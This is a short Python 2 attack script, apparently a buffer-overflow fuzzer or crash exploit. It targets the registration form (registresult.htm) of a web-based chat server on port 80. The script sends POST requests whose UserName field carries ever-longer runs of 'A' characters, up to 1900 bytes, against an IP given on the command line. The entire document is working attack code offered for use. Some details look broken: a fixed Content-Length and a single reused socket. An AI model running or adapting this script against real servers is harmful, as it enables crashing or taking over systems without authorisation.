# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Desc.		: 
# OS		: 
# Date		: 

import sys
import struct
from socket import create_connection as cc
import time

def p(a):
	return struct.pack("I", a)

if len(sys.argv) < 2:
	print 'Usage : {} TARGET_IP'.format(sys.argv[0])
	sys.exit()

host = str(sys.argv[1])
port = 80

try:
	sock = cc((host, port))
except:
	print "Connection Error\n"
	sys.exit()

payload = ""
payload += "POST /registresult.htm HTTP/1.1\r\n"
payload += "Host: 192.168.3.131\r\n"
payload += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
payload += "Accept-Language: en-US,en;q=0.5\r\n"
payload += "Referer: http://192.168.3.131/register.ghp\r\n"
payload += "Connection: close\r\n"
payload += "Upgrade-Insecure-Requests: 1\r\n"
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: 182\r\n"
payload += "\r\n"
payload += "UserName={}&Password=blah&Password1=blah&Sex=2&Email=blah%40blah.com&Icon=0.gif&Resume=blah&cw=1&RoomID=%3C%21--%24RoomID--%3E&RepUserName=%3C%21--%24UserName--%3E&submit1=Register\r\n"


for i in range(100, 2000, 100):
	junk = "A"*i

	print "Sending UB3R Payl0ad :D", i
	sock.send(payload.format(junk))
	time.sleep(1)
